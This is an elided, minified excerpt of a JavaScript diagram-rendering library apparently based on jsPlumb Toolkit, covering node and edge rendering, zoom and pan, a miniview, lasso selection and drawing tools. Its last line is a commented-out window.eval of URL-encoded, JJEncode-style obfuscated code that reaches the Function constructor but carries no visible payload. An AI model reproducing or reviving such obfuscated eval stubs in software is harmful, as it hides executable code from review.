                  c && (I.isDebugEnabled() && console.log("Renderer", "removing edge", b),
                  ta(b),
                  delete oa[b.getId()],
                  null != c._jsPlumb && $.deleteConnection(c, {
                      fireEvent: !1
                  }))
              }
          }),
          ...
          l(k.edgeTarget, function(a) {
              if (!fa) {
                  ...
                  c ? $.silently(function() {
                      null != e ? (I.isDebugEnabled() && console.log("target change", c),
                      $.setTarget(c, e)) : (delete oa[b.getId()],
                      $.detach({
                          connection: c,
                          forceDetach: !0,
                          fireEvent: !1
                      }))
                  }) : null != e && I.isDebugEnabled() && d.log("Target for Edge " + b.getId() + " changed to Node " + e.id + "; we have no valid connection.")
              }
          }),
          l(k.edgeSource, function(a) {
              if (!fa) {
                  ...
                  c ? $.silently(function() {
                      null != e ? $.setSource(c, e) : (delete oa[b.getId()],
                      $.detach({
                          connection: c,
                          forceDetach: !0,
                          fireEvent: !1
                      }))
                  }) : null != e && I.isDebugEnabled() && d.log("Source for Edge " + b.getId() + " changed to Node " + e.id + "; we have no valid connection.")
              }
          }),
          ...
          l(k.portAdded, function(a) {
              ...
              if (Fa.getPortDefinition(I.getPortType(a.data)).isEndpoint)
                  ...
                  Y || (null != c ? (c = $.getElement(c),
                  q(c, a.port, b, a.node)) : jsPlumbUtil.log("no element rendered for port", a.port, a.data))
              }
      ...
      var Ga = []
        , Ha = function(a) {
          return null == a ? I : "string" == typeof a ? I.select(a, !0) : a.jtk ? I.select(a.jtk.port || a.jtk.node, !0) : a
      };
      ...
      this.asynchronousPortRendered = function(a, b, c) {
          ...
          if (!e)
              return f;
          try {
              a = p(e.object, a, d, e.objectType, e.def, e.node, e.jtkClass, e.jtkAttributeName, e.makeDraggable),
              ia[b.id + I.getGraph().getPortSeparator() + d] = a;
              return q(a, f, ja[b.id] || ga[b.id], b),
              m(),
              f
          } catch (a) {
              return jsPlumbUtil.log("Cannot finish asynchronous render of port", a),
              null
          } finally {
              delete Ja[d]
          }
      ...
      var La = function(a, b, c, d, f, g, h, i) {
          return function(j, k, l) {
              var m, n = b(k), o = null, q = c(k), r = Fa[d](q), s = k;
              if (R) {
                  s = e.extend({}, r ? r.parameters || {} : {}),
                  e.extend(s, k);
                  var t = {};
                  for (m in s)
              ...
              if (r) {
                  ...
                  if (null == (o = r.templateRenderer ? r.templateRenderer(u, s, I, a, H, r, l) : Q.render(u, s, I, a, H, r, l))) {
                      try {
        ...
        , Ma = La("node", I.getNodeId, I.getNodeType, "getNodeDefinition", B, !0, j.NODE, h.NODE)
        , Na = La("port", I.getPortId, I.getPortType, "getPortDefinition", B, !1, j.PORT, h.PORT)
        , Oa = La("group", I.getNodeId, I.getNodeType, "getGroupDefinition", B, !1, j.GROUP, h.GROUP);
      this.initialize = function() {
          var b, c, d, e, f;
          if (I.setSuspendGraph(!0),
          $.setSuspendDrawing(!0),
          a.jsPlumbInstance) {
              ...
              for (b = 0,
              d = I.getGroupCount(); b < d; b++)
                  e = I.getGroupAt(b),
                  W(e) && Ba(e);
              for (b = 0,
              d = I.getNodeCount(); b < d; b++)
                  c = I.getNodeAt(b),
                  W(c) && Aa(c);
              var j = function(a) {
                  var b = I.getAllEdgesFor(a);
                  for (f = 0; f < b.length; f++)
                      if (b[f].source === a || b[f].source.getNode && b[f].source.getNode() === a) {
      ...
      this.getRenderedElement = function(a) {
          if (null == a)
              return null;
          var b = a.getFullId();
          return a.objectType === g.portType ? ia[b] : a.objectType === g.groupType ? ja[b] : ga[b]
      }
      ,
      ...
      this.getRenderedEndpoint = function(a) {
          var b = A(a)
            , c = null;
          return b && b.obj && "Port" === b.obj.objectType && $.selectEndpoints({
              element: b.el
          }).each(function(a) {
      ...
      var Pa = function(a) {
        ...
        , Qa = function(a, b) {
          ...
          if (!c.Layouts[e.type])
              throw "no such layout [" + e.type + "]";
          return e.jsPlumbToolkit = I,
          e.adapter = new n(b,H),
          e.locationFunction || (e.locationFunction = function(a) {
              return [f.data(a.data, T), f.data(a.data, U)]
          }
          ),
      ...
      ,
      this.reload = function() {
          jsPlumbUtil.log("JSPLUMB: `reload` method not implement unless you're rendering a Selection")
      }
      ,
      ...
      var Ua = function(a, b, c) {
          ...
          m.events)
              for (t in m.events)
                  n.events[t] = o(m.events[t]);
          if (m.interceptors)
              for (t in m.interceptors)
                  n[t] = p(m.interceptors[t]);
          var v = a.value("anchor-x")
            ...
            , z = a.value("offset-x")
            , B = a.value("offset-y");
          return null != v && null != w && (n.anchor = [parseFloat(v), parseFloat(w), parseInt(x || "0", 10), parseInt(y || "0", 10), parseFloat(z || "0"), parseFloat(B || "0")]),
          e.extend(n, c || {}),
        ...
        , Xa = function(a, b) {
          var c, d, f = e.getSelector(a, i.PORT), g = e.getSelector(a, i.SOURCE), h = e.getSelector(a, i.TARGET);
      ...
      this.storePositionsInModel = function(a) {
          ...
          for (var e in d) {
              ...
              g && (f.data(g.data, b, d[e][0]),
              f.data(g.data, c, d[e][1]))
          }
                      ...
                      for (var e = I.getAllEdgesFor(a), f = 0; f < e.length; f++)
                          if (b) {
                              var g = e[f].source.getNode ? e[f].source.getNode() : e[f].source
                                , h = e[f].target.getNode ? e[f].target.getNode() : e[f].target
                                , i = g === a ? h : g
                                , j = H.isVisible(i);
                              j && y(e[f], b, c)
                          } else
      ...
      this.destroy = function() {
          for (var a, b = 0; b < wa.length; b++)
              try {
                  a = wa[b],
                  I.unbind(a.event, a.fn)
              } catch (b) {
                  d.log("WARN: Could not unbind event " + a.event + " during destroy operation.")
              }
...
function() {
  ...
  var b = this
    ...
    , k = "function" == typeof g[j] ? g[j] : g[j][i]
    , l = "function" == typeof h[j] ? h[j] : h[j][i]
    , m = function(a) {
      return k(a || event)
  }
    , n = function(a) {
    ...
    , o = function(a, b, c) {
      return function(d) {
          if (!b || null == d.mozInputSource || 1 === d.mozInputSource) {
              ...
              (!c || d.metaKey || d.ctrlKey) && a(d, f, e, d.metaKey || d.ctrlKey)
          }
      }
  }
        ...
        , r = {
          pointer: function() {
              var b = {}
                ...
                , s = function(a) {
                  null != b["" + a.pointerId] && (delete b["" + a.pointerId],
                  n--,
                  o = 0 !== n,
                  h())
              }
          ...
          touch: function(a) {
              var b = function(a) {
                ...
                , r = function(c) {
                  var h = b(c);
                  2 === h.length && !1 !== a.enableWheelZoom && (d = l(h),
                  e = f = k(h),
                  m = !0,
                  a.bind(document, o, t),
                  a.bind(document, p, s),
                ...
                , t = function(a) {
                  if (m) {
                      var c = b(a);
                      2 === c.length && (jsPlumbUtil.consume(a),
                      e = k(c),
                      d = l(c),
                      g(j))
                  }
...
function() {
  ...
  this.ZoomWidget = function(a) {
      ...
      , s = r(q), t = a.viewport, u = r(t), v = a.events.zoom || p, w = (a.events.maybeZoom,
      a.events.pan || p), x = a.events.mousedown || p, y = a.events.mouseup || p, z = a.events.mousemove || p, A = a.events.transformOrigin || p, B = !(!1 === a.clamp), C = !1 !== a.clampZoom, D = a.panDistance || 50, E = !1 !== a.enablePan, F = !0 === a.directRender, G = !1 !== a.enableWheelZoom, H = !1 !== a.enableAnimation, I = a.wheelFilter || function() {
          return !0
      }
      , J = !0 === a.wheelZoomMetaKey, K = !0 === a.wheelReverse ? -1 : 1, L = K * (a.wheelSensitivity || 10), M = !0 === a.wheelPan, N = !1 !== a.enablePanButtons, O = (a.padding,
      !1 !== a.consumeRightClick), P = a.smartMinimumZoom, Q = !1, R = "mousedown", S = "mouseup", T = "mousemove", U = ["webkit", "Moz", "ms"], V = a.bind, W = a.unbind, X = !(!1 === a.enabled), Y = a.clampToBackground, Z = a.clampToBackgroundExtents, $ = a.filter || function(a) {
          return !1
      }
      , _ = a.width, aa = a.height, ba = 0, ca = 0, da = a.zoom || 1, ea = [0, 0], fa = !1, ga = !1, ha = !1, ia = !1, ja = a.zoomRange || [.05, 3], ka = 150, la = -1, ma = -1, na = {
          minx: [],
          maxx: [],
          miny: [],
          maxy: []
      }, oa = {}, pa = {}, qa = {}, ra = !1, sa = function() {
        ...
        , Ca = function(b, c, d) {
          return function() {
              ...
              za = window.setTimeout(function() {
                  a.bind(document, S, Fa),
                  Aa = window.setInterval(Ea(b, c), wa)
              }, va)
          }
      }
        , Da = function() {
      ...
      var Ha = function(a, b, c) {
        ...
        , Oa = function(a) {
          ...
          return b && b[0] && b[1] ? b : null != a.pageX ? [a.pageX, a.pageY] : [0, 0]
      };
      ...
      var Pa = function(a, b) {
        ...
        , Va = function(b, c, d, e, f, g, h) {
          ...
          var i = Ua(c, d);
          return H && !f && a.animate ? a.animate(b, {
              left: i[0],
              top: i[1]
          }, {
              step: h,
        ...
        , Ya = {
          start: function(b, c) {
              if (!ga) {
                  ...
                  X && (d === s || d === u || d._jtkDecoration || i && i.owns(d) || !0 === $(d, b)) && (ia = !1,
                  la = -1,
                  ma = -1,
                  3 !== b.which || !1 === a.enableWheelZoom || null != b.mozInputSource && 1 !== b.mozInputSource ? c.length <= 1 && (fa = !0,
                  j = Oa(b),
                  n = Va(s),
                  jsPlumbUtil.consume(b)) : (ha = !0,
                  j = Oa(b),
                  Ma(b),
                  n = Va(s),
                  k = da)),
      ...
      G) {
          var cb = function(a, b, c, d) {
            ...
            , eb = function(a, b, c, d) {
              I(a) && (a.preventDefault && a.preventDefault(),
              a.stopPropagation && a.stopPropagation(),
      ...
      this.relayout = function(b) {
          if (!1 === a.enablePan) {
              s.style.width = b[2] - b[0] + "px",
              s.style.height = b[3] - b[1] + "px",
              s.style.left = "0",
              s.style.top = "0";
              var c = b[0] < 0 ? -b[0] : 0
                , d = b[1] < 0 ? -b[1] : 0;
              s.style.transform = "translateX(" + c + "px) translateY(" + d + "px)",
      ...
      this.centerContent = function(a) {
          if (!F) {
              ...
              Va(s, !1 !== a.horizontal ? g - c[0] : j[0], !1 !== a.vertical ? h - c[1] : j[1], null, a.doNotAnimate, function() {
                  a.doNotFirePanEvent || w(!1 !== a.horizontal ? g - j[0] : 0, !1 !== a.vertical ? h - j[1] : 0, da, da),
                  i && i.pan(),
                  kb && kb.pan(),
      ...
      this.setZoomRange = function(a, b) {
          return null != a && 2 === a.length && a[0] < a[1] && null != a[0] && null != a[1] && a[0] > 0 && a[1] > 0 && (ja = a,
          b || (da < ja[0] || da > ja[1]) && Ra(da)),
          ja
      }
      ,
      ...
      this.findIntersectingNodes = function(b, c, d, e, f) {
          var g, h = this.getApparentCanvasLocation(), i = a.offset(u), j = u.scrollLeft, k = u.scrollTop, l = [], m = {
              x: b[0],
              y: b[1],
              w: c[0],
              h: c[1]
          }, n = d ? Biltong.encloses : Biltong.intersects, o = [i.left + h[0] - j, i.top + h[1] - k];
          if (f = f || oa,
          Array.isArray(f)) {
              var p = {};
          ...
          for (g in f)
              if (!qa[g]) {
                  ...
                  if (q) {
                      ...
                      n(m, r) && (null == e || e(g, pa[g], r)) && l.push({
                          id: g,
                          el: pa[g],
                          r: r
                      })
...
function() {
  ...
  c.Surface = function(a) {
      ...
      var n, o = d.getElement(a.container), p = c.createElement({
      ...
      }, o), q = !0 !== a.directRender && !(!1 === a.elementsDraggable), r = !0 !== a.directRender && !0 === a.elementsDroppable, s = a.dragOptions || {}, t = a.dropOptions || {}, u = a.stateHandle, v = !1 !== a.storePositionsInModel, w = a.modelLeftAttribute, x = a.modelTopAttribute, y = !0 === a.directRender, z = new ZoomWidget({
          viewport: o,
          canvas: p,
          ...
          onSelect: function(a, b, c, d) {
              ...
              d && A.length > 0 && m.toolkit.removeFromSelection(A);
              for (var f = [], g = z.findIntersectingNodes(a, b, !c[0]), h = g.length, i = 0; i < h; i++)
                  null != B && !1 === B(e(g[i])) || (f.push(e(g[i])),
                  m.jsPlumb.addToDragSelection && m.jsPlumb.addToDragSelection(g[i].el));
              A = f,
      ...
      y && d.addClass(o, g.SURFACE_DIRECT),
      !1 === a.enablePan && d.addClass(o, g.SURFACE_NO_PAN);
      var G = function(a, b) {
          var c = function(a) {
              var c = a.srcElement || a.target;
              c != o && c != p || l.fire(b, a, l)
          };
          m.jsPlumb.on(p, a, c),
          m.jsPlumb.on(o, a, c)
      };
      G(i.tap, i.canvasClick),
      G(i.dblclick, i.canvasDblClick);
      var H = null;
      m.makeDraggable = function(a, b) {
          if (q) {
              ...
              j[n] = e.wrap(j[n], function() {
                  ...
                  d.removeClass(o.querySelectorAll("." + g.MOST_RECENTLY_DRAGGED), g.MOST_RECENTLY_DRAGGED),
                  ...
                  for (var b = function(b) {
                      ...
                      try {
                          ...
                          if (!b[0]._droppedOnGroup) {
                              ...
                              j.magnetize && !c.node.group ? c.pos = e.setMagnetizedPosition(c.node.id, c.pos[0], c.pos[1], !0) : e.setPosition(c.node.id, c.pos[0], c.pos[1], !0),
                              z.positionChanged(b[0]),
                              !1 !== v && (l.storePositionInModel({
                                  id: c.node.id,
                                  leftAttribute: w,
                                  topAttribute: x
                              }),
      ...
      var I = this.importNode = function(b, c) {
          ...
          d.addClass(b, g.NODE),
          q && !d.isAlreadyDraggable(b) && m.makeDraggable(b),
          m.nodeMap()[c] = b,
          ...
          (null == b.jtk.node.group || m.isIgnoreGroups()) && l.getLayout().nodeAdded(f),
          l.fire(i.nodeAdded, f)
      }
      .bind(this);
      ...
      this.animateToSelection = function(a) {
          this.zoomToSelection(jsPlumb.extend(a || {}, {
              doNotAnimate: !1
          }))
      }
      ,
      this.zoomToBackground = z.zoomToBackground,
      this.zoomToVisible = function(a) {
          a = d.extend({}, a || {}),
          a.selection = m.toolkit.filter(function(a) {
      ...
      this.zoomToVisibleIfNecessary = function(a) {
          ...
          this.zoomToVisible(b)
      }
      ,
      this.zoomToFit = z.zoomToFit,
      this.zoomToFitIfNecessary = z.zoomToFitIfNecessary,
      ...
      ,
      this.centerContent = z.centerContent,
      this.centerContentHorizontally = z.centerContentHorizontally,
      this.centerContentVertically = z.centerContentVertically,
      this.getViewportCenter = z.getViewportCenter,
      this.setViewportCenter = z.setViewportCenter,
      this.setSize = function(a, b, c) {
      ...
      ,
      this.getApparentCanvasLocation = z.getApparentCanvasLocation,
      this.setApparentCanvasLocation = z.setApparentCanvasLocation,
      this.getBoundsInfo = z.getBoundsInfo,
      this.setZoom = z.setZoom,
      this.setZoomRange = z.setZoomRange,
      this.getZoomRange = z.getZoomRange,
      this.getZoom = z.getZoom,
      this.nudgeZoom = z.nudgeZoom,
      this.nudgeWheelZoom = z.nudgeWheelZoom,
      this.pageLocation = z.pageLocation,
      this.getPan = z.getPan,
      this.pan = z.pan,
      this.setPan = z.setPan,
      ...
      ,
      m.jsPlumb.bind("startConnectionEdit", function() {
          console.log("start connection edit")
      }),
      m.jsPlumb.bind("clearConnectionEdits", function() {
          console.log("clear connection edits")
      }),
      m.jsPlumb.bind("stopConnectionEdit", function() {
          console.log("stop connection edit")
      }),
      ...
      this.mapLocation = z.mapLocation,
      this.mapEventLocation = z.mapEventLocation,
      this.findNearbyNodes = z.findNearbyNodes,
      this.findIntersectingNodes = z.findIntersectingNodes,
      this.findIntersectingGroups = function(a, b, c, d) {
          return z.findIntersectingNodes(a, b, c, d, m.reverseGroupMap())
      }
      ,
      this.isInViewport = z.isInViewport,
      this.getViewportCenter = z.getViewportCenter,
      this.positionElementAt = z.positionElementAt,
      this.positionElementAtEventLocation = z.positionElementAtEventLocation,
      this.positionElementAtPageLocation = z.positionElementAtPageLocation,
      this.setFilter = z.setFilter,
      this.floatElement = z.floatElement,
      this.fixElement = z.fixElement;
      var J = this.setPosition
        , K = this.animateToPosition
        , L = function(a, b, c) {
          a && (z.positionChanged(a.el, [b, c]),
      ...
      this.tracePath = function(a) {
          ...
          if (b.exists()) {
              ...
              .bind(this)
                ...
                , f = null
                , g = null
                , h = b.path.path.length;
              b.eachEdge(function(a, b) {
                  m.getConnectionForEdge(b).addClass("jtk-animate-edge-traversable")
              });
              for (var i = 1; i < h; i++) {
              ...
              e[e.length - 1].handler.bind(jsPlumbToolkit.Events.endOverlayAnimation, function() {
                  b.eachEdge(function(a, b) {
                      var c = m.getConnectionForEdge(b);
                      if (!c) return
      ...
      this.setMode = function(a, b, c) {
          ...
          c && a === h.select && c.lassoSelectionFilter && (B = c.lassoSelectionFilter),
      ...
      this.repaint = function(a) {
          ...
          if (b.el) {
              m.jsPlumb.recalculateOffsets(b.el),
              m.jsPlumb.revalidate(m.jsPlumb.getId(b.el));
              var c = m.jsPlumb.getSize(b.el)
                , d = b.obj.getFullId();
              l.setSize(d, c[0], c[1]),
      ...
      var R = function(a) {
          ...
          if (!(a && (a.droppables || a.source && a.selector || !0 === a.allowNative)))
          ...
          , n = null, p = a.droppables ? a.droppables : a.source ? a.source.querySelectorAll(a.selector) : [], q = a.dragOptions || {}, r = a.dropOptions || {}, s = "scope_" + (new Date).getTime(), t = function(b, c, d) {
              n && l.getJsPlumb().removeClass(n.el, "jtk-drag-hover");
              var e = !0;
              if (a.drop && (e = !1 !== a.drop.apply(this, arguments)),
              e) {
                  var g = l.getJsPlumb()
                    , h = m.jsPlumb.getDragObject(arguments)
                    , i = g.getOffset(d ? F : h, !0)
                    , o = z.mapLocation(i.left, i.top)
                    , p = j ? j(h, b, d, o) : null
                    , q = f ? f(p, h, b, o) : {}
                  ...
                  k(o.left, o.top, q),
                  r ? m.toolkit.getGroupFactory()(p, q, function(c) {
                      var d = m.toolkit.addGroup(c, {
                          position: o
                      });
                      return a.onDrop && a.onDrop(d, b, o),
                      d
                      ...
                      return a.onDrop && a.onDrop(d, b, o),
                      null != n && l.relayoutGroup(n.group),
                      d
                  }, b, d)
              }
          }, u = function() {
              n && l.getJsPlumb().removeClass(n.el, "jtk-drag-hover"),
              n = null,
              a.start && a.start.apply(a.start, arguments)
          }, v = function() {
              try {
                  if (n && l.getJsPlumb().removeClass(n.el, "jtk-drag-hover"),
                  "true" === arguments[0].el.getAttribute("jtk-group"))
                      n = null;
                  else {
                  ...
                  jsPlumbUtil.log("WARN: could not compute target groups for new node drag " + a)
              }
              a.drag && a.drag.apply(a.drag, arguments)
          }, w = d.dragEvents[h.start], x = d.dragEvents[h.drag], y = d.dragEvents[h.stop], A = d.dragEvents[h.drop], B = function() {}, C = a.nativeFilter || [], D = a.allowNative, E = {};
          if (q[w] = e.wrap(q[w], u),
          q[x] = e.wrap(q[x], v),
          q[y] = e.wrap(q[y], a.stop || B),
          r.scope = s,
          r[A] = e.wrap(r[A], t),
          D) {
              var F = document.createElement(h.div);
              for (F.style.position = h.absolute,
              c = 0; c < C.length; c++)
                  E[C[c]] = !0;
              var G = function(a) {
              ...
              document.addEventListener(i.dragover, function(a) {
                  a.stopPropagation(),
                  a.preventDefault(),
                  G(a) && (d.setAbsolutePosition(F, [a.pageX, a.pageY]),
                  q[x].apply(null, [a, {
                      helper: F,
                      offset: {
                          left: a.pageX,
          ...
          var H = m.jsPlumb.getEventManager()
            , I = new Katavorio({
              bind: H.on,
              unbind: H.off,
              ...
              getPosition: function(a, b) {
                  var c = z.calculateCumulativeScroll(a)
                    , d = z.calculateOffset(a);
      ...
      this.setTargetEnabled = S.bind(this, "Target"),
      this.setSourceEnabled = S.bind(this, "Source"),
      ...
      this._destroy = function() {
          ...
          d.removeClass(o, g.SURFACE),
          d.removeClass(o, g.SURFACE_DIRECT),
      ...
      this.State = {
          ...
          serialize: function() {
              var a = z.getPan();
              a.push(z.getZoom()),
              a.push.apply(a, z.getTransformOrigin());
              var b = a.join(",")
          ...
          deserialize: function(a) {
              var b = a.split(",");
              z.setPan(parseFloat(b[0]), parseFloat(b[1])),
              z.setZoom(parseFloat(b[2])),
              z.setTransformOrigin(parseFloat(b[3]), parseFloat(b[4]));
  ...
  c.Miniview = function(a) {
      ...
      function k(a) {
          if (p && A && !u) {
              ...
              var h = [b[0] * f, b[1] * f];
              o = [c[0] - h[0], c[1] - h[1]],
              e.setAbsolutePosition(s, o)
          }
      }
      function l(a) {
          if (null != A) {
              t = p.getBoundsInfo(),
              a = a || e.getAbsolutePosition(s);
      ...
      }, q), t = a.bounds, u = !0 === a.suspended, v = !1 !== a.collapsible, w = a.typeFunction, x = null, y = !1, z = a.wheelSensitivity || 10, A = new ZoomWidget({
          viewport: q,
          canvas: r,
      ...
      , G = function(a) {
          ...
          d.consume(a),
          p.nudgeWheelZoom(a.normalizedWheelDelta * z, a)
      };
      e.on(window, h.resize, jsPlumbUtil.debounce(function() {
          k()
      }, 100)),
      ...
      .bind(this)
        , N = function(a, b) {
          ...
          d.forEach(function(a) {
              c = h[a.id];
              var b = f[a.id];
              A.positionChanged(b, c),
              e.setAbsolutePosition(b, c)
          });
          var j = e.getSize(b);
          i.style.width = j[0] + g.px,
          i.style.height = j[1] + g.px,
          k()
      }
      .bind(this)
        , O = function(a, b) {
              ...
              if (null == h[d]) {
                  var j = e.getSize(a.el)
                    , l = c.createElement({
                      ...
                      left: 0,
                      top: 0,
                      clazz: f.MINIVIEW_ELEMENT + (b ? " " + b : "") + (a.node ? " " + a.node.data.type : "")
                  });
                  if (w && l.setAttribute("jtk-miniview-type", w(a.node || a.group)),
      ...
      edgePaintHandler = function(a, b) {
          var d = a.node.id;
          var h = m.nodeMap();
          var el = a.node.el;
          if (!el || !el.firstElementChild) return;
          if (null == h[d]) {
            var l = el.cloneNode(true);
            var childNodes = l.childNodes;
            childNodes[1] && l.removeChild(childNodes[1]);
            childNodes[0] && childNodes[0].setAttribute('stroke-width', 4);
            r.appendChild(l);
            h[d] = l;
          } else {
            Array.prototype.slice.call(el.style).forEach(function (k) {
              h[d].style[k] !== el.style[k] && (h[d].style[k] = el.style[k])
            })
            ;['width', 'height'].forEach(function (k) {
              if (h[d].getAttribute(k) !== el.getAttribute(k)) {
                h[d].setAttribute(k, el.getAttribute(k))
              }
            })
            el.firstElementChild &&
            h[d].firstElementChild &&
            h[d].firstElementChild.getAttribute('d') !== el.firstElementChild.getAttribute('d') &&
            h[d].firstElementChild.setAttribute('d', el.firstElementChild.getAttribute('d'))
          }
      },
      connRemovedHandler = function(a, b) {
          var d = a.node.id;
          var h = m.nodeMap();
          if (!h[d]) return;
          r.removeChild(h[d]);
      ...
      this.registerNode = function(a) {
          P(a, a.group ? f.MINIVIEW_GROUP_ELEMENT : ""),
          M(a)
      }
      ;
      ...
      this.setOffset = function(a, b) {
          ...
          A.positionChanged(a, [b.left, b.top])
      }
      ;
      var R = this.setAbsolutePosition;
      this.setAbsolutePosition = function(a, b) {
          R.call(this, a, b),
          A.positionChanged(a, b)
      }
      ,
      this.setVisible = function(a) {
          J = a,
          q.style.display = a ? g.block : g.none
      }
      ,
              ...
              if (a.nodes && a.group) {
                  ...
                  if (!0 !== a.nodesRemoved)
                      for (var i = 0; i < a.nodes.length; i++)
                          f = a.nodes[i],
                          (g = d[f.id]) && (h = a.nodePositions[f.id],
                          h && (A.positionChanged(g, h),
                          e.setAbsolutePosition(g, h)),
                          r.appendChild(g))
              }
              A.remove(c),
              delete d[b],
              m.jsPlumb.removeElement(c),
              L(!0)
          }
      ...
      p.bind('connPainted', edgePaintHandler),
      p.bind('connRemoved', connRemovedHandler),
...
function() {
  ...
  var a = this
    ...
    , l = function() {};
  c.Lasso = function(a) {
      var b, c = a.canvas, e = !1, m = {}, n = [0, 0], o = a.onStart || l, p = a.onEnd || l, q = a.onSelect || l, r = !1, s = !1, t = !0 === a.invert, u = !!window.MSInputMethodContext && !!document.documentMode, v = function(a, c) {
          if (t) {
...
function() {
  ...
  var y = function(a) {
    ...
    , F = function(a, b, c) {
      for (var d = c.querySelectorAll("[jtk-att]"), e = 0; e < d.length; e++) {
          var f = d[e].tagName.toUpperCase()
            ...
            , i = u.data(b, h);
          null != i && G[g](d[e], i),
          a && d[e].getAttribute("jtk-commit") && ("INPUT" === f ? o.on(d[e], "keyup", function(a) {
    ...
    , G = {
      ...
      SELECT: function(a, b) {
          for (var c = a.getAttribute("multiple"), d = 0; d < a.options.length; d++)
              if (c)
                  b.indexOf(a.options[d].value) > -1 && (a.options[d].selected = !0);
              else if (a.options[d].value === b)
                  return void (a.selectedIndex = d)
      },
    ...
    , K = function(a) {
      for (var b = a.querySelectorAll("[jtk-att]"), c = {}, d = 0; d < b.length; d++) {
          var e = b[d].tagName.toUpperCase()
            , f = "INPUT" === e ? (b[d].getAttribute("type") || "TEXT").toUpperCase() : e
            , g = H[f](b[d])
            , h = b[d].getAttribute("jtk-att");
          if (null != g) {
              var i = u.data(c, h);
              null != i ? (jsPlumbUtil.isArray(i) || (i = [i],
              u.data(c, h, i)),
              i.push(g)) : u.data(c, h, g)
          }
      }
      return c
  }
...
function() {
  ...
  a.jsPlumbToolkit.DrawingTools = function(a) {
      var b, c, d = a.renderer, e = d.getToolkit(), f = d.getJsPlumb(), g = {}, h = a.widthAttribute || "w", i = a.heightAttribute || "h", j = a.leftAttribute || "left", k = a.topAttribute || "top", l = a.onEdit || function() {}
      , m = function() {
          for (var a in g) {
              var b = g[a];
      ...
      this.reset = m;
      var n, o, p, q, r, s, t, u = function(a, b, c, d) {
...
.call("undefined" != typeof window ? window : this)
//window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D"));
